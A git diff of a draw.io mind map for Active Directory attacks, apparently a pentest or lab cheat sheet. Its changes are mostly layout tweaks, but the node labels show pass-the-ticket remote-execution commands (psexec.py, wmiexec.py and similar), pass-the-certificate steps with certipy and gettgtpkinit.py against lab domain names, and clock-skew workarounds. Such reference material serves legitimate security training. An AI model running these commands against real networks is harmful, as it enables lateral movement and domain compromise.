@@ -1,4 +1,4 @@
-<mxfile host="app.diagrams.net" modified="2023-04-05T08:18:12.725Z" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0" etag="_QAIilKqSQJt7O7aug0j" version="21.1.4" type="github" pages="6">
+<mxfile host="app.diagrams.net" modified="2023-04-05T11:44:42.001Z" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0" etag="X_O759iM0S78jN58_GF8" version="21.1.4" type="github" pages="6">
   <diagram id="OxgtQte6AoLRu1fJhFKF" name="Reconnaissance">
     <mxGraphModel dx="3083" dy="882" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
@@ -476,7 +476,11 @@
           <mxGeometry x="-420" y="1265" width="130" height="70" as="geometry" />
         </mxCell>
         <mxCell id="f0MQeKMFGhf8GMfAAniV-3" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0.75;entryY=1;entryDx=0;entryDy=0;" parent="1" source="YItOHf5SX_0kVXQKCcuo-1" target="Iw_T4d_-wb4pz08Lo9XD-3" edge="1">
-          <mxGeometry relative="1" as="geometry" />
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points">
+              <mxPoint x="383" y="1240" />
+            </Array>
+          </mxGeometry>
         </mxCell>
         <mxCell id="YItOHf5SX_0kVXQKCcuo-2" value="" style="edgeStyle=none;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" parent="1" source="f0MQeKMFGhf8GMfAAniV-1" target="YItOHf5SX_0kVXQKCcuo-1" edge="1">
           <mxGeometry relative="1" as="geometry" />
@@ -710,40 +714,40 @@
       <root>
         <mxCell id="0" />
         <mxCell id="1" parent="0" />
-        <mxCell id="ofW6ee_2hHjbur6R9mH3-4" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="Mr1Rn-nBtmzZ--9cH1cQ-3" target="nNKB30-F6r5E_Skve4N4-2">
+        <mxCell id="ofW6ee_2hHjbur6R9mH3-4" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" parent="1" source="Mr1Rn-nBtmzZ--9cH1cQ-3" target="nNKB30-F6r5E_Skve4N4-2" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <mxCell id="Mr1Rn-nBtmzZ--9cH1cQ-3" value="&lt;div&gt;&lt;div align=&quot;center&quot;&gt;Pass the ticket (exec commands)&lt;br&gt;&lt;/div&gt;&lt;div align=&quot;center&quot;&gt;&lt;br&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;psexec.py -k &#39;DOMAIN/USER@TARGET&#39; -no-pass&lt;br&gt;smbexec.py -k &#39;DOMAIN/USER@TARGET&#39;&lt;br&gt;wmiexec.py -k &#39;DOMAIN/USER@TARGET&#39;&lt;br&gt;atexec.py -k &#39;DOMAIN/USER@TARGET&#39;&lt;br&gt;dcomexec.py -k &#39;DOMAIN/USER@TARGET&#39;&lt;/font&gt;&lt;br&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
+        <mxCell id="Mr1Rn-nBtmzZ--9cH1cQ-3" value="&lt;div&gt;&lt;div align=&quot;center&quot;&gt;Pass the ticket (exec commands)&lt;br&gt;&lt;/div&gt;&lt;div align=&quot;center&quot;&gt;&lt;br&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;psexec.py -k &#39;DOMAIN/USER@TARGET&#39; -no-pass&lt;br&gt;smbexec.py -k &#39;DOMAIN/USER@TARGET&#39;&lt;br&gt;wmiexec.py -k &#39;DOMAIN/USER@TARGET&#39;&lt;br&gt;atexec.py -k &#39;DOMAIN/USER@TARGET&#39;&lt;br&gt;dcomexec.py -k &#39;DOMAIN/USER@TARGET&#39;&lt;/font&gt;&lt;br&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
           <mxGeometry x="1210" y="261" width="320" height="190" as="geometry" />
         </mxCell>
-        <mxCell id="TZj8oe7FIHMln2289y6j-4" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=0;exitDx=0;exitDy=0;" edge="1" parent="1" source="nNKB30-F6r5E_Skve4N4-1" target="nNKB30-F6r5E_Skve4N4-3">
+        <mxCell id="TZj8oe7FIHMln2289y6j-4" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=0;exitDx=0;exitDy=0;" parent="1" source="nNKB30-F6r5E_Skve4N4-1" target="nNKB30-F6r5E_Skve4N4-3" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <mxCell id="nNKB30-F6r5E_Skve4N4-1" value="Certificat" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#60a917;fontColor=#ffffff;strokeColor=#2D7600;" vertex="1" parent="1">
+        <mxCell id="nNKB30-F6r5E_Skve4N4-1" value="Certificat" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#60a917;fontColor=#ffffff;strokeColor=#2D7600;" parent="1" vertex="1">
           <mxGeometry x="330" y="550" width="120" height="60" as="geometry" />
         </mxCell>
-        <mxCell id="nNKB30-F6r5E_Skve4N4-2" value="Accès machine" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#a20025;fontColor=#ffffff;strokeColor=#6F0000;" vertex="1" parent="1">
+        <mxCell id="nNKB30-F6r5E_Skve4N4-2" value="Accès machine" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#a20025;fontColor=#ffffff;strokeColor=#6F0000;" parent="1" vertex="1">
           <mxGeometry x="1310" y="550" width="120" height="60" as="geometry" />
         </mxCell>
-        <mxCell id="ofW6ee_2hHjbur6R9mH3-2" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="nNKB30-F6r5E_Skve4N4-3" target="ofW6ee_2hHjbur6R9mH3-1">
+        <mxCell id="ofW6ee_2hHjbur6R9mH3-2" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="nNKB30-F6r5E_Skve4N4-3" target="ofW6ee_2hHjbur6R9mH3-1" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <mxCell id="nNKB30-F6r5E_Skve4N4-3" value="&lt;div&gt;Pass the certificate&lt;br&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12&lt;/font&gt;&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;gettgtpkinit.py -pfx-base64 $(cat cert.b64) &#39;essos.local&#39;/&#39;meereen$&#39; &#39;meereen.ccache&#39;&lt;/font&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
+        <mxCell id="nNKB30-F6r5E_Skve4N4-3" value="&lt;div&gt;Pass the certificate&lt;br&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12&lt;/font&gt;&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;gettgtpkinit.py -pfx-base64 $(cat cert.b64) &#39;essos.local&#39;/&#39;meereen$&#39; &#39;meereen.ccache&#39;&lt;/font&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
           <mxGeometry x="230" y="293" width="320" height="125" as="geometry" />
         </mxCell>
-        <mxCell id="c2D2YZhtQaV_8EULeIIU-1" value="&lt;div align=&quot;left&quot;&gt;If clock errors:&lt;br&gt;&lt;/div&gt;&lt;div align=&quot;left&quot;&gt;-detect remote clock-skew : nmap -sV -sC 10.10.11.202&lt;/div&gt;&lt;div align=&quot;left&quot;&gt;- faketime -f &#39;+2h&#39; zsh&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;align=left;fillColor=#f0a30a;strokeColor=#BD7000;fontColor=#000000;" vertex="1" parent="1">
+        <mxCell id="c2D2YZhtQaV_8EULeIIU-1" value="&lt;div align=&quot;left&quot;&gt;If clock errors:&lt;br&gt;&lt;/div&gt;&lt;div align=&quot;left&quot;&gt;-detect remote clock-skew : nmap -sV -sC 10.10.11.202&lt;/div&gt;&lt;div align=&quot;left&quot;&gt;- faketime -f &#39;+2h&#39; zsh&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;align=left;fillColor=#f0a30a;strokeColor=#BD7000;fontColor=#000000;" parent="1" vertex="1">
           <mxGeometry x="230" y="200" width="320" height="80" as="geometry" />
         </mxCell>
-        <mxCell id="ofW6ee_2hHjbur6R9mH3-3" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="ofW6ee_2hHjbur6R9mH3-1" target="TZj8oe7FIHMln2289y6j-1">
+        <mxCell id="ofW6ee_2hHjbur6R9mH3-3" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="ofW6ee_2hHjbur6R9mH3-1" target="TZj8oe7FIHMln2289y6j-1" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <mxCell id="ofW6ee_2hHjbur6R9mH3-1" value="Get TGT ticket" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
+        <mxCell id="ofW6ee_2hHjbur6R9mH3-1" value="Get TGT ticket" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
           <mxGeometry x="631" y="326" width="120" height="60" as="geometry" />
         </mxCell>
-        <mxCell id="TZj8oe7FIHMln2289y6j-2" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;" edge="1" parent="1" source="TZj8oe7FIHMln2289y6j-1" target="Mr1Rn-nBtmzZ--9cH1cQ-3">
+        <mxCell id="TZj8oe7FIHMln2289y6j-2" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;" parent="1" source="TZj8oe7FIHMln2289y6j-1" target="Mr1Rn-nBtmzZ--9cH1cQ-3" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <mxCell id="TZj8oe7FIHMln2289y6j-1" value="&lt;div&gt;Set TGT in memory&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;export KRB5CCNAME=administrator.ccache&lt;/font&gt;&lt;br&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
+        <mxCell id="TZj8oe7FIHMln2289y6j-1" value="&lt;div&gt;Set TGT in memory&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;export KRB5CCNAME=administrator.ccache&lt;/font&gt;&lt;br&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
           <mxGeometry x="850" y="339" width="270" height="34" as="geometry" />
         </mxCell>
       </root>
